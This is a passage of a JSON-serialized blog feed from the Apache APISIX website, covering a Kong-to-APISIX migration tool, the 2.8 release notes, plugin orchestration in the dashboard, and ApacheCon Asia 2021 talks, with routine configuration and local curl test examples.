filtering.\\n\\n## About the Author\\n\\nWei Jin, Apache APISIX PMC and Apache SkyWalking committer.\\n\\n![Jin Wei\'s profile](https://static.apiseven.com/202108/1630651158654-2e028970-9e09-4d52-bf72-ab53aa98706b.png)"},{"id":"2021/08/05/kong-to-apisix","metadata":{"permalink":"/blog/2021/08/05/kong-to-apisix","source":"@site/blog/2021/08/05/Kong-to-APISIX.md","title":"Kong-To-APISIX Migration Tool","description":"You can use the Kong-To-APISIX migration tool to migrate Kong\'s configuration to the cloud-native API gateway Apache APISIX with one click.","date":"2021-08-05T00:00:00.000Z","formattedDate":"August 5, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":3.315,"truncated":true,"authors":[{"name":"\u5434\u8212\u65f8","url":"https://github.com/Yiyiyimu","imageURL":"https://avatars.githubusercontent.com/u/34589752?v=4"}],"prevItem":{"title":"How to Improve the Observability of Nginx with Apache APISX","permalink":"/blog/2021/08/06/using-apache-apisix-to-improve-the-observability-of-nginx"},"nextItem":{"title":"Release Apache APISIX 2.8.0","permalink":"/blog/2021/07/28/release-apache-apisix-2.8"}},"content":"> Apache APISIX is a production-ready open source seven-layer full traffic processing platform that serves as an API gateway for business entry traffic with high performance, low latency, official dashboard support, and over fifty plugins. If you are using Kong and are interested in APISIX but struggle to get started, try our just open source migration tool Kong-To-APISIX to help you migrate smoothly with one click.\\n\\n\x3c!--truncate--\x3e\\n\\nApache APISIX is a production-ready open source seven-layer full traffic processing platform that serves as an API gateway for business entry traffic with high performance, low latency, official dashboard support, and over fifty plugins. If you are using Kong and are interested in APISIX but struggle to get started, try our just open source migration tool Kong-To-APISIX to help you migrate smoothly with one click.\\n\\n## What is Kong-To-APISIX\\n\\n[Kong-To-APISIX](https://github.com/api7/kong-to-apisix) leverages the declarative configuration files of Kong and APISIX to migrate configuration data, and adapts to the architecture and functionality of both sides. Currently, we support the migration of configuration data for Route, Service, Upstream, Target, Consumer and three plugins Rate Limiting, Proxy Caching and Key Authentication on one side of Kong, and we have completed a minimal demo using Kong\u2019s Getting Started Guide as an example . We have completed a minimal demo.\\n\\n## How to migrate configuration\\n\\n1. To export a Kong declarative configuration file using Deck, refer to the following steps: [Kong Official Document: Backup and Restore of Kong\u2019s Configuration](https://docs.konghq.com/deck/1.7.x/guides/backup-restore/)\\n\\n1. Download the repository and run the migration tool, which will generate the declarative configuration file `apisix.yaml` to be used.\\n\\n      ```shell\\n      git clone https://github.com/api7/kong-to-apisix\\n\\n      cd kong-to-apisix\\n\\n      make build\\n\\n      ./bin/kong-to-apisix migrate --input kong.yaml --output apisix.yaml\\n\\n      # migrate succeed\\n      ```\\n\\n1. Use `apisix.yaml` to configure APISIX, refer to [Apache APISIX Official Document: Stand-alone mode](https://apisix.apache.org/docs/apisix/deployment-modes/#standalone).\\n\\n## Demo Test\\n\\n1. Make sure docker is up and running, deploy the test environment, and use docker-compose to run APISIX and Kong.\\n\\n   ```shell\\n   git clone https://github.com/apache/apisix-docker\\n\\n   cd kong-to-apisix\\n\\n   ./tools/setup.sh\\n   ```\\n\\n1. Add configuration to Kong and test it according to Kong\'s Getting Started Guide.\\n   1. Expose services via Service and Route for routing and forwarding\\n   1. Set up Rate Limiting and Proxy Caching plugins for flow limiting caching\\n   1. Set up Key Authentication plugin for authentication\\n   1. Set up load balancing via Upstream and Target\\n\\n1. Export Kong\'s declarative configuration file to `kong.yaml`.\\n\\n   ```shell\\n   go run ./cmd/dumpkong/main.go\\n   ```\\n\\n1. Run the migration tool, import `kong.yaml` and generate the APISIX configuration file `apisix.yaml` to docker volumes.\\n\\n   ```shell\\n   export EXPORT_PATH=./repos/apisix-docker/example/apisix_conf\\n   go run ./cmd/kong-to-apisix/main.go\\n   ```\\n\\n1. Test whether the migrated routes, load balancing, plugins, etc. are working properly on Apache APISIX side.\\n\\n   1. Test key auth plugin.\\n\\n      ```shell\\n      curl -k -i -m 20 -o /dev/null -s -w %{http_code} http://127.0.0.1:9080/mock\\n      # output: 401\\n      ```\\n\\n   1. Test proxy cache plugin.\\n\\n      ```shell\\n      # access for the first time\\n      curl -k -I -s  -o /dev/null http://127.0.0.1:9080/mock -H \\"apikey: apikey\\" -H \\"Host: mockbin.org\\"\\n      # see if got cached\\n      curl -I -s -X GET http://127.0.0.1:9080/mock -H \\"apikey: apikey\\" -H \\"Host: mockbin.org\\"\\n      # output:\\n      #   HTTP/1.1 200 OK\\n      #   ...\\n      #   Apisix-Cache-Status: HIT\\n      ```\\n\\n   1. Test limit count plugin.\\n\\n      ```shell\\n      for i in {1..5}; do\\n         curl -s -o /dev/null -X GET http://127.0.0.1:9080/mock -H \\"apikey: apikey\\" -H \\"Host: mockbin.org\\"\\n      done\\n      curl -k -i -m 20 -o /dev/null -s -w %{http_code} http://127.0.0.1:9080/mock -H \\"apikey: apikey\\" -H \\"Host: mockbin.org\\"\\n      # output: 429\\n      ```\\n\\n   1. Test load balance.\\n\\n      ```shell\\n      httpbin_num=0\\n      mockbin_num=0for i in {1..8}; do\\n         body=$(curl -k -i -s http://127.0.0.1:9080/mock -H \\"apikey: apikey\\" -H \\"Host: mockbin.org\\")\\n         if [[ $body == *\\"httpbin\\"* ]]; then\\n      httpbin_num=$((httpbin_num+1))\\n         elif [[ $body == *\\"mockbin\\"* ]]; then\\n            mockbin_num=$((mockbin_num+1))\\n         fi\\n         sleep 1.5done\\n      echo \\"httpbin number: \\"${httpbin_num}\\", mockbin number: \\"${mockbin_num}\\n      # output:\\n      #   httpbin number: 6, mockbin number: 2\\n      ```\\n\\n## Conclusion\\n\\nSubsequent development plans for the migration tool are presented in the Roadmap on Kong-To-APISIX\'s [GitHub repository](https://github.com/api7/kong-to-apisix). Feel free to test and use Kong-To-APISIX, and discuss any questions you may have in the Issues section of the repository. Anyone who is interested in this project is welcome to contribute to it!"},{"id":"Release Apache APISIX 2.8.0","metadata":{"permalink":"/blog/2021/07/28/release-apache-apisix-2.8","source":"@site/blog/2021/07/28/release-apache-apisix-2.8.md","title":"Release Apache APISIX 2.8.0","description":"API Gateway Apache APISIX 2.8 version released independent keepalive connection pool, stream proxy enhancement, support for custom balancer and other functions.","date":"2021-07-28T00:00:00.000Z","formattedDate":"July 28, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.345,"truncated":true,"authors":[{"name":"Ruofei Zhao","url":"https://github.com/Serendipity96","imageURL":"https://avatars.githubusercontent.com/u/23514812?v=4"}],"prevItem":{"title":"Kong-To-APISIX Migration Tool","permalink":"/blog/2021/08/05/kong-to-apisix"},"nextItem":{"title":"Apply Plugin Orchestration in Apache APISIX","permalink":"/blog/2021/07/27/use-of-plugin-orchestration-in-apache-apisix"}},"content":"> Apache APISIX version 2.8 is released!\\n\\n\x3c!--truncate--\x3e\\n\\nApache APISIX version 2.8 is released! \ud83c\udf89 This version has 30+ developers participated, more than 100 PRs had been submitted, and supports **1 new feature, 1 new experience, 2 new plugins, and 2 new ways to develop**. Read and learn about the new features in version 2.8!\\n\ud83d\udc47\ud83d\udc47\ud83d\udc47\\n\\n## Release Notes\\n\\n### New feature: Independent Keepalive connection pool\\n\\nStarting with [version 2.7](https://apisix.apache.org/blog/2021/06/29/release-apache-apisix-2.7), we have added Apache APISIX\'s own patches and the Nginx C module to enhance the native Nginx, allowing dynamic setup of increasing number of Nginx configurations. In version 2.8, Apache APISIX supports the configuration of independent Keepalive connection pools at the Upstream level.\\n\\nThe following features are currently included:\\n\\n- Dynamically set mTLS\\n- Dynamically set client_max_body_size\\n- Upstream Keepalive (2.8 new feature)\\n- gzip (2.8 new Plug-in)\\n\\nIn future releases, we will continue to allow the following Nginx configurations to be set dynamically:\\n\\n- real_ip\\n- proxy_max_temp_file_size\\n- \u2026\u2026\\n\\nAn example of Upstream configuration:\\n\\n```JSON\\n{\\n    \\"id\\": \\"backend\\",\\n    \\"nodes\\": {\\"host:80\\": 100},\\n    \\"type\\":\\"roundrobin\\",\\n    \\"keepalive_pool\\": {\\n        \\"size\\": 4,\\n        \\"idle_timeout\\": 8,\\n        \\"requests\\": 16\\n    }\\n}\\n```\\n\\n### New experience: Enhance stream proxy\\n\\nIn version 2.8, the [ip-restriction](http://apisix.apache.org/docs/apisix/plugins/ip-restriction/) and [limit-conn](http://apisix.apache.org/docs /apisix/plugins/limit-conn/) had been duplicated from the HTTP section to the stream section. The benefit of this way is to enhance gateway capabilities in the stream proxy and to increase the security of the upstream services.\\n\\nip-restriction can be used to filter IP black and white list to ensure that only requests from a specific IP can access the backend service.\\n\\nlimit-conn can be used to limit the number of simultaneous connections on a route, limiting the number of concurrent client accesses.\\n\\n### New plug-in: gzip\\n\\nApache APISIX version 2.8 contains the gzip plug-in. Using the gzip plug-in, you can **dynamically set route-level gzip parameters**.\\n\\nAn example of gzip configuration:\\n\\n```JSON\\n{\\n    \\"plugins\\": {\\n        \\"gzip\\": {\\n            \\"min_length\\": 20,\\n            \\"http_version\\": 1.1,\\n            \\"buffers\\": {\\n                \\"number\\": 32,\\n                \\"size\\": 4096\\n            },\\n            \\"types\\": [\\n                \\"text/html\\"\\n            ],\\n            \\"comp_level\\": 1,\\n            \\"vary\\": false\\n        }\\n    }\\n}\\n```\\n\\n### New plug-in: ua-restriction\\n\\nThe `ua-restriction` plugin is used to check if the User-Agent is in the black and white list, which is a very common requirement and can be enabled by way of a plugin.\\n\\nAn example of `ua-restriction` configuration:\\n\\n```JSON\\n{\\n    \\"plugins\\": {\\n        \\"ua-restriction\\": {\\n            \\"denylist\\": [\\n                \\"my-bot1\\",\\n                \\"(Baiduspider)/(\\\\\\\\d+)\\\\\\\\.(\\\\\\\\d+)\\"\\n            ]\\n        }\\n    }\\n}\\n```\\n\\n### New way to develop: Support for executing specific logic by plug-ins\\n\\nBased on Apache APISIX architecture, many features are implemented by plug-ins. Starting from version 2.8, **Apache APISIX supports executing specific logic by plug-ins after selecting an upstream node.**\\n\\nDefine the following method in the plug-in:\\n\\n```Lua\\nfunction _M.balancer(conf, ctx)\\n    core.log.notice(\\"IP: \\", ctx.balancer_ip, \\", Port: \\", ctx.balancer_port)\\nend\\n```\\n\\nIn this example, the log will output the IP and Port of the upstream.\\n\\n**Which scenario does the above method apply to?**\\n\\n1. After selecting the upstream node and before accessing the upstream\\n2. Before each retry\\n\\nFor the best performance, the above method first runs in the access phase of OpenResty (APISIX actually selects the upstream node in the access phase) and the method does not overlap with the OpenResty phase of the same name.\\n\\n### New way to develop: Support for custom balancer\\n\\nIn version 2.8, users can customize the balancer. **The balancer is loading with minimum number of connections, polling, consistency hash, etc.**\\n\\nAlthough Apache APISIX already provides a set of balancers, users may need to use balancers that are closely related to the business, such as: need to consider the server room, availability zone, etc. Supporting for custom balancer, users can develop their own balancer and load it via `require(\\"apisix.balancer.your_balancer\\")`.\\n\\nUsually a custom balancer requires node to provide data which is from other than the host/port, you can put data in the metadata, for example:\\n\\n```JSON\\n{\\n    \\"nodes\\": [\\n        { \\"host\\": \\"0.0.0.0\\", \\"port\\": 1980, \\"weight\\": 1, \\"metadata\\": {\\"b\\": 1} }\\n    ]\\n}\\n```\\n\\n## Download\\n\\nDownload Apache APISIX 2.8.0\\n\\n- Source code: please visit [download page](https://apisix.apache.org/downloads/)\\n- Binary installation package: please visit [Installation Guide](https://apisix.apache.org/docs/apisix/how-to-build/)"},{"id":"2021/07/27/use-of-plugin-orchestration-in-apache-apisix","metadata":{"permalink":"/blog/2021/07/27/use-of-plugin-orchestration-in-apache-apisix","source":"@site/blog/2021/07/27/use-of-plugin-orchestration-in-Apache-APISIX.md","title":"Apply Plugin Orchestration in Apache APISIX","description":"Read this article to learn about Apache APISIX and basic usage scenarios, and how Apache APISIX integrates \\"drag and drop\\" plugin orchestration capabilities in a low-code trend.","date":"2021-07-27T00:00:00.000Z","formattedDate":"July 27, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.59,"truncated":true,"authors":[{"name":"Zhiyuan Ju","url":"https://github.com/juzhiyuan","imageURL":"https://avatars.githubusercontent.com/u/2106987?v=4"}],"prevItem":{"title":"Release Apache APISIX 2.8.0","permalink":"/blog/2021/07/28/release-apache-apisix-2.8"},"nextItem":{"title":"ApacheCon Asia 2021: Apache APISIX Technical Topics","permalink":"/blog/2021/07/25/apachecon-asia"}},"content":"> Read this article to learn about Apache APISIX and basic usage scenarios, and how Apache APISIX integrates \\"drag and drop\\" plugin orchestration capabilities in a low-code trend.\\n\\n\x3c!--truncate--\x3e\\n\\n## What is Apache APISIX?\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway. Apache APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more. It has more than 50 built-in plugins covering authentication, security, traffic control, Serverless, observability, and other aspects to meet the common usage scenarios of enterprise customers.\\n\\nAs shown in the architecture diagram below, Apache APISIX is divided into two parts: the data plane (left side) and the control plane (right side): the control plane sends down the configuration to ETCD, and the data plane handles internal and external traffic with the help of rich plug-ins.\\n\\n![Apache APISIX architecture](https://static.apiseven.com/202108/1639466553989-ecae1a31-8121-4390-a830-f386b9b12322.png)\\n\\nApache APISIX exposes a set of interfaces that allow us to bind plugins to the API. If we want to add speed-limiting capabilities to the API, we can simply bind the `limit-req` plugin to the API.\\n\\n``` shell\\ncurl -X PUT http://127.0.0.1:9080/apisix/admin/routes/1 -d \'\\n\\n {\\n   \\"uri\\": \\"/get\\",\\n   \\"methods\\": [\\"GET\\"],\\n   \\"upstream\\": {\\n     \\"type\\": \\"roundrobin\\",\\n     \\"nodes\\": {\\n       \\"httpbin.org:80\\": 1\\n     }\\n   },\\n   \\"plugins\\": {\\n     \\"limit-req\\": {\\n       \\"rate\\": 1,\\n       \\"burst\\": 2,\\n       \\"rejected_code\\": 503,\\n       \\"key\\": \\"remote_addr\\"\\n     }\\n   }\\n }\'\\n```\\n\\nAfter a successful call, the request will be speed-limited when it reaches the API.\\n\\nThis example uses limit-req to implement API speed limit (which is a specific function of Apache APISIX), but how to do it for the scenario of \\"decide the subsequent request processing logic based on the processing result of a plugin\\"? Currently, the existing plugin mechanism can not meet this demand, which then leads to the ability of plugin orchestration to solve this problem.\\n\\n## What is Plugin Orchestration?\\n\\nPlugin orchestration is a form of low-code that can help enterprises reduce usage costs and increase operation and maintenance efficiency, and is an indispensable capability in the process of digital transformation. With the plugin orchestration capability in the low-code API gateway Apache APISIX, we can easily orchestrate 50+ plugins in a \u201cdrag-and-drop\u201d way, and the orchestrated plugins can share contextual information to realize scenario-based requirements.\\n\\nExtending the above API speed limit scenario: the request is authenticated using the key-auth plugin, and if the authentication passes, the kafka-logger plugin takes over and logs; if the authentication fails (the plugin returns a 401 status code), the limit-req plugin is used to limit the speed.\\n\\nSee the following video on how to do it.\\n\\n<iframe\\n    height=\\"350\\"\\n    width=\\"100%\\"\\n    src=\\"https://api7-website-1301662268.file.myqcloud.com/202107/%E6%8F%92%E4%BB%B6%E7%BC%96%E6%8E%92.mp4\\"\\n    frameborder=\\"0\\">\\n</iframe>\\n\\nIn this video, the Web interface lists the currently available plugins and drawing boards, and we can drag and drop the plugins onto the drawing boards to arrange them and fill in the data bound to the plugins, and then the whole process is completed. In the whole process.\\n\\nThe Web interface lists the currently available plugins and drawing boards, and we can drag and drop the plugins onto the drawing boards to arrange them and fill in the data bound to the plugins, and then the whole process is completed. In the whole process.\\n\\n1. operation visualization: we can use the interface visualization in addition to the creation of API, but also through the ability to orchestrate intuitive and clear scenario design.\\n\\n1. process reusable: by importing and exporting the JSON data of the drawing board, you can easily reuse the project data generated by orchestration.\\n\\n1. Combine to create new \\"plugins\\": treat each scene as a plugin, and combine different plugins by using conditional components to create \\"plugins\\".\\n\\n## How Plugin Orchestration Works?\\n\\nSo how does Apache APISIX combine with low-code capabilities? This requires the data side Apache APISIX and the control side Apache APISIX Dashboard to work together. The overall process is as follows.\\n\\n![Apache APISIX plugin orchestration flow](https://static.apiseven.com/202108/1639466624894-039f4e63-fd21-403a-94c5-6efc8425eb0f.png)\\n\\n### Apache APISIX\\n\\nIn Apache APISIX, we have added `script` execution logic to the Route entity, which can be used to receive and execute Lua functions generated by Dashboard, and it supports calling existing plugins to reuse the code. In addition, it also works on various stages of the HTTP request lifecycle, such as `access`, `header_filer`, `body_filter`, etc. The system will automatically execute the script function corresponding to the stage code at the corresponding stage, see the following `script` example.\\n\\n```shell\\n{\\n\\n  \\"script\\": \\"local _M = {} \\\\n function _M.access(api_ctx) \\\\n ngx.log(ngx.INFO,\\\\\\"hit access phase\\\\\\") \\\\n end \\\\nreturn _M\\"\\n\\n}\\n```\\n\\n### Apache APISIX Dashboard\\n\\nDashboard contains two sub-components, Web and ManagerAPI: Web provides a visual interface to configure the API gateway; ManagerAPI provides a RESTful API for the Web or other clients to call in order to operate the configuration center (ETCD by default) and thus indirectly control Apache APISIX.\\n\\nIn order to generate legal and efficient script functions, ManagerAPI chose the DAG directed acyclic graph data structure for the underlying design and developed the `dag-to-lua` [project](https://github.com/api7/dag-to-lua): it takes the root node as the start node and decides the next flow plugin based on the judgment It uses the root node as the start node and decides the next flow plugin based on the judgment condition, which will effectively avoid logical dead loops. The following is a diagram of the DAG data structure.\\n\\n![Apache APISIX plugin orchestration DAG data structure](https://static.apiseven.com/202108/1639466682723-dcfd5c1b-9ae7-42b4-b3c2-c00aaf7a5996.png)\\n\\nCorresponding to the script parameters received by ManagerAPI, the example is as follows.\\n\\n```shell\\n{\\n  \\"conf\\": {\\n    \\"1-2-3\\": {\\n      \\"name\\": \\"plugin-a\\",\\n      \\"conf\\": {\\n        ...\\n\\n      }\\n    },\\n\\n    \\"4-5-6\\": {\\n      \\"name\\": \\"plugin-b\\",\\n      \\"conf\\": {\\n        ...\\n      }\\n    },\\n    \\"7-8-9\\": {\\n      \\"name\\": \\"plugin-c\\",\\n      \\"conf\\": {\\n        ...\\n      }\\n    }\\n  },\\n\\n  \\"rule\\": {\\n    \\"root\\": \\"1-2-3\\", # initial node ID\\n    \\"1-2-3\\": [\\n      [\\n        \\"code == 200\\",\\n        \\"4-5-6\\"\\n      ], [\\n        \\"\\",\\n        \\"7-8-9\\"\\n      ]\\n    ]\\n  }\\n}\\n```\\n\\nAfter the client converts the final orchestrated data into the above format, ManagerAPI generates Lua functions with the help of the dag-to-lua project and hands them over to Apache APISIX for execution.\\n\\nOn the Web side, after selection, comparison and project validation, we chose Ant Group\'s open source X6 graph editing engine as the underlying framework for the Web part of the plugin orchestration. In addition to perfect and clear documentation, a series of out-of-the-box interactive components and node customizability are the reasons we chose it.\\n\\n![X6 introduction](https://static.apiseven.com/202108/1639466742487-269ebd5a-4f6c-47c3-a941-1275a4b3d178.png)\\n\\nIn the process of orchestration implementation, we abstract the concept of generic components and plug-in components: generic components are start nodes, end nodes and conditional judgment nodes, while plug-in components are every available Apache APISIX plug-in, and the process of plug-in orchestration is completed by dragging and dropping these components into the drawing board. As shown in the figure.\\n\\n![Apache APISIX dashboard plugin orchestration demo1](https://static.apiseven.com/202108/1639466805116-0e1c9a83-e5d0-40c1-8a76-8cb1402a491c.png)\\n\\nDuring the drag and drop process, we need to restrict a series of boundary conditions, here are a few examples.\\n\\nWhen the plugin is not configured, the system will show the error message \\"There are unconfigured components\\", which allows you to visually see which plugin does not have configuration data.\\n\\n![Apache APISIX dashboard plugin orchestration demo2](https://static.apiseven.com/202108/1639466853301-a67de136-633d-4b5d-9062-ac17bf625063.png)\\n\\nWhen an API is edited, if the API is already bound with plugin data, when using the plugin orchestration mode, a warning message will appear after detection, and the system can only proceed if the user explicitly confirms that he/she wants to use the orchestration mode. This can effectively prevent the API data from being manipulated by mistake.\\n\\n![Apache APISIX dashboard plugin orchestration demo3](https://static.apiseven.com/202108/1639466907551-07ec82f9-8988-4a66-a5f2-d3944d4f239c.png)\\n\\nIn addition, there are cases such as the start element can only have one output and the conditional judgment element can only have one input. Imagine: if the system allows users to operate without restrictions, unreasonable plugin combinations will be meaningless and generate unpredictable errors, so the continuous enrichment of boundary conditions is also an important consideration when designing the plugin arrangement.\\n\\nWhen we finish the orchestration, we will use the API exposed by X6 to generate the JSON data of the flowchart, then convert it into the DAG data needed by the system, and finally generate Lua functions.\\n\\n## Future Plans\\n\\nThe drag-and-drop approach makes it easier for users to combine plugins to meet different scenarios to enhance the scalability and operation and maintenance experience of API gateways. In the process of actual use, there are the following issues that can continue to be optimized.\\n\\n1. The current boundary judgment conditions of the components are not rich enough, by continuing to improve these conditions to reduce unreasonable combinations of orchestration.\\n\\n1. There are not many orchestration examples at present, and providing more reference examples can facilitate developers to learn and users to use.\\n\\n1. The current Apache APISIX uses the code defined by the plugin for status return (exceptions return the status code, the request is terminated), can support more HTTP Response field or even modify the plugin definition to extend the plugin orchestration capabilities, such as the following plugin definition.\\n\\n```shell\\nlocal _M = {\\n  version = 0.1,\\n  priority = 2500,\\n  type = \'auth\',\\n  name = plugin_name,\\n  schema = schema,\\n  # A new result field has been added to store the results of plugin runs and pass them on to the next plugin\\n  result = {\\n    code = {\\n      type = \\"int\\"\\n    }\\n  }\\n}\\n```"},{"id":"ApacheCon Asia 2021: Apache APISIX Technical Topics","metadata":{"permalink":"/blog/2021/07/25/apachecon-asia","source":"@site/blog/2021/07/25/apachecon-asia.md","title":"ApacheCon Asia 2021: Apache APISIX Technical Topics","description":"This article introduces the topics shared by the cloud native API gateway Apache APISIX at ApacheCon Asia, including identity authentication, current limit and speed limit, etc.","date":"2021-07-25T00:00:00.000Z","formattedDate":"July 25, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":6.15,"truncated":true,"authors":[{"name":"Apache APISIX"}],"prevItem":{"title":"Apply Plugin Orchestration in Apache APISIX","permalink":"/blog/2021/07/27/use-of-plugin-orchestration-in-apache-apisix"},"nextItem":{"title":"Live | Apache APISIX x Kubernetes","permalink":"/blog/2021/07/21/apache-apisix-kubernetes"}},"content":"> ApacheCon is the official global conference series of the Apache Software Foundation. Since 1998, ApacheCon has been attracting participants at all levels to explore the \\"technologies of tomorrow\\" across more than 350 Apache projects and their diverse communities. ApacheCon Asia is the ApacheCon organizing committee\'s online conference for the Asia-Pacific region. ApacheCon Asia 2021 will be held online from August 6-8 this year.\\n\\n\x3c!--truncate--\x3e\\n\\n## About ApacheCon Asia 2021\\n\\nApacheCon is the official global conference series of the Apache Software Foundation. Since 1998, ApacheCon has been attracting participants at all levels to explore the \\"technologies of tomorrow\\" across more than 350 Apache projects and their diverse communities.\\n\\nApacheCon Asia is the ApacheCon organizing committee\'s online ApacheCon conference for the Asia-Pacific region, with the primary goal of better serving the rapidly growing number of Apache users and contributors in the region. ApacheCon Asia 2021 will be held online from August 6-8 this year.\\n\\n![ApacheCon Asia 2021](https://static.apiseven.com/202108/1635750552467-1d0013df-9caa-43a3-bed2-b914d856c413.png)\\n\\nThe ApacheCon Asia 2021 team has recently announced the conference program. The Apache APISIX community is actively involved in this annual open source event, and has proposed a total of 8 API/microservices technology-related topics, which are rich in content and welcome your attention. For those who cannot attend the online conference, ApacheCon Asia 2021 also provides a replay and recorded video of each topic, please visit [Apache Local Community](https://space.bilibili.com/609014805).\\n\\n## About API / Microservices Technology Topics\\n\\nAPIs are the cornerstone of service connectivity, allowing us to build services and make them available to users; as applications become more complex, monolithic applications are gradually being split into microservices, allowing for rapid iteration of products while also creating technical challenges in security, maintenance, and observability.\\n\\nApache APISIX is the top project of Apache and the most active open source gateway project in the world. In this topic, you will not only learn about the Apache APISIX design philosophy, but also learn about the best practices of the Apache APISIX project.\\n\\n## Application and Practice of Apache APISIX in Mobile Cloud Object Storage EOS\\n\\n### Session Description\\n\\nThis talk is about the application and practice of Apache APISIX in China Mobile\'s public cloud object storage EOS. First, we introduce the construction plan of China Mobile\'s public cloud and the evolution of object storage products, then we explain why we chose Apache APISIX as the load balancing gateway, and introduce the three stages of EOS traffic management architecture evolution. At the same time, we also shared what practical production problems we solved based on Apache APISIX, what solutions and development work we did, and finally, we explained some of our future evolution plans.\\n\\n### Sharing Guests\\n\\n![Yanshan Chen](https://static.apiseven.com/202108/1639465900639-ce850138-e0f5-4264-a902-be8ca94b93c0.png)\\n\\nYanshan Chen - After graduation, he has been working on distributed storage software development and architecture design, and has been deeply involved in the construction process of mobile cloud, focusing on the selection of major technology solutions and landing development and construction work related to object storage. At the same time, he has rich practical experience in the field of distributed object storage, and is currently thinking about implementing object storage traffic governance based on APISIX seven-tier gateway to achieve further architectural upgrade.\\n\\n### Share Time\\n\\n2021-08-07 15:30 GMT+8\\n\\n## Using Apache APISIX to implement flow limiting and speed limiting\\n\\nWhen it comes to speed limiting, Nginx is the first thing that comes to mind, but Nginx is implemented through a configuration file that requires reloads for each change, making it extremely cumbersome to run and maintain. On the other hand, speed limiting conditions are limited to Nginx variables, making it difficult to achieve fine-grained speed limiting for business purposes.\\n\\nThis session will show how to use Apache APISIX to achieve dynamic, fine-grained, and distributed reload limiting, and how to use plug-in orchestration to achieve reload limiting that better meets business needs.\\n\\n### Guest Speakers\\n\\n![Junxu Chen](https://static.apiseven.com/202108/1639465952917-9089d8e8-4509-4d14-91d9-84b587cb5e7d.png)\\n\\nJunxu Chen - Internet veteran, worked in Sina, Xunlei, 360 and other well-known Internet companies, Apache APISIX Committer.\\n\\n### Share time\\n\\n2021-08-06 13:30 GMT+8\\n\\n## Testing Apache APISIX recovery with Chaos.com\\n\\nApache APISIX is one of the leading API gateways OSS. To ensure that everything goes as planned, APISIX uses different kinds of tests, including unit, e2e and fuzzy tests. However, we are still not sure how APISIX will behave when some abnormal but unavoidable circumstances occur, such as network failure, IO stress or pod failure.\\n\\nTherefore, here we use Chaos Mesh, a Kubernetes-based chaos engineering platform that can smoothly inject different kinds of chaos and integrate them into our CI pipeline. At the end of this talk, the audience will learn where Chaos Engineering will benefit the API gateway and how to integrate Chaos Mesh into your own test pipeline.\\n\\n### Sharing Guests\\n\\n![Shuyang Wu](https://static.apiseven.com/202108/1639466011014-75736153-f109-4318-a693-38e3bb59cbdd.png)\\n\\nShuyang Wu - Committer for Apache APISIX and Chaos Mesh, he leads the integration of Chaos Mesh with Apache APISIX CI.\\n\\n### Share Time\\n\\n2021-08-06 14:50 GMT+8\\n\\n## Authentication and Authorization with Apache APISIX\\n\\nAuthentication and authorization are very necessary features in API gateways. This way, the services located behind the gateway are protected from unauthorized or malicious access, data leakage, and hacking. Apache APISIX is a dynamic, real-time, high-performance API gateway. And it provides many plug-ins, including authentication and authorization like key-auth, Open-ID, wolf-RBAC, etc. This proposal describes how to use Apache APISIX for authentication and authorization.\\n\\n### Sharing Guests\\n\\n![Xinxin Zhu](https://static.apiseven.com/202108/1639466066729-9b4d07e2-47f3-4725-99d5-5266864e1c73.png)\\n\\nXinxin Zhu - Apache APISIX Committer, with years of CDN experience and familiar with gateways.\\n\\n### Share time\\n\\n2021-08-06 15:30 GMT+8\\n\\n## Relying on the community to make Apache APISIX grow fast\\n\\nIn the past year, Apache APISIX has become the most active API gateway project in the world, not only because of its advanced technology, but also because of the highly active community. As of today, there are 225 contributors from all over the world, and the number is still growing rapidly. This session will introduce APISIX\'s experience in practicing \\"community over code\\". As an idealistic startup, how to combine with Apache culture to make the startup grow fast.\\n\\n### Guest Speakers\\n\\n![Yuansheng Wang](https://static.apiseven.com/202108/1639466127487-bc14552c-5326-43f6-8753-c0df363c3922.png)\\n\\nYuansheng Wang - Founder and PMC member of open source enthusiast Apache APISIX.\\n\\n### Share time\\n\\n2021-08-06 16:10 GMT+8\\n\\n## How to extend Apache APISIX as a side car for a service grid\\n\\nIn this topic I will introduce the apisix-mesh-agent project, which has some capabilities to extend Apache APISIX as a sidecar in a service grid scenario, and more importantly, it uses the xDS protocol to get configurations from control planes like Istio, Kuma, etc. Afterwards, I will present future plans and expectations regarding the use of Apache APISIX in service grids.\\n\\n### Sharing Guests\\n\\n![Chao Zhang](https://static.apiseven.com/202108/1639466178896-23fb5c6e-ccb1-46e0-ac02-55fef1b3bedf.png)\\n\\nChao Zhang - Apache APISIX PMC, OpenResty contributor, open source enthusiast, now working on Service Mesh, Kubernetes and API Gateway.\\n\\n### Share time\\n\\n2021-08-07 13:30 GMT+8\\n\\n### Evolution of Apache APISIX\\n\\nApache APISIX is one of the most popular API gateways: https://github.com/apache/apisix I will describe the evolution of Apache APISIX, including.\\n\\n1. the good decisions we\'ve made\\n2. the bad decisions we\'ve made\\n3. our future plans\\n\\n### Sharing Guests\\n\\n![Zexuan Luo](https://static.apiseven.com/202108/1639466430768-b416eea2-e8e3-4a50-91b9-2d6b05aead10.png)\\n\\nZexuan Luo - Apache APISIX PMC, OpenResty developer.\\n\\n### Share time\\n\\n2021-08-07 14:10 GMT+8\\n\\n### Apache APISIX-based implementation of KUBERNETES INGRESS\\n\\nIntroducing the benefits of Apache APISIX-based Kubernetes Ingress and the features of Apache APISIX Ingress.\\n\\n### Sharing Guests\\n\\n![Jin Wei](https://static.apiseven.com/202108/1639466497596-7e4b91a9-2367-457a-ad33-0c5db7b87c24.png)\\n\\nWei Jin - Apache APISIX PMC, Apache apisix-ingress-controller Founder, Apache Skywalking Committer.\\n\\n### Share time\\n\\n2021-08-07 14:50 GMT+8"},{"id":"2021/07/21/apache-apisix-kubernetes","metadata":{"permalink":"/blog/2021/07/21/apache-apisix-kubernetes","source":"@site/blog/2021/07/21/Apache-APISIX-Kubernetes.md","title":"Live | Apache APISIX x Kubernetes","description":"On Friday, July 23rd, 2021 at 00:00 GMT, Apache APISIX committer Jintao Zhang will present \\"Run Apache APISIX in Kubernetes\\" at the Data on Kubernetes Community Meetup for global developers.","date":"2021-07-21T00:00:00.000Z","formattedDate":"July 21, 